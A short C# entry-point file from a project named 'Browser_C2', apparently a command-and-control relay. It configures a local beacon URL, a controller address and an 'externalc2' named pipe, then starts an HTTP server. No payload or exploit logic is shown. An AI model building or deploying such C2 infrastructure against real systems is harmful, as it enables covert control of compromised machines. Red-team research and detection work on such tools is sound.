using System.Threading.Tasks;

namespace Browser_C2
{
    internal class Program

    {
        public static string BeaconURL = "http://127.0.0.1:9828/";
        public static string AllowedOrigin = "127.0.0.1:9828";
        public static string ControllerURL = "http://1.1.1.1:8080/";
        public static string PipeName = "externalc2";

        private static async Task Main(string[] args)
        {
            HTTP _http = new HTTP();
            _http.AllowedOrigin = AllowedOrigin;
            _http.Prefix = BeaconURL;
            await _http.StartServerAsync();
        }
    }
}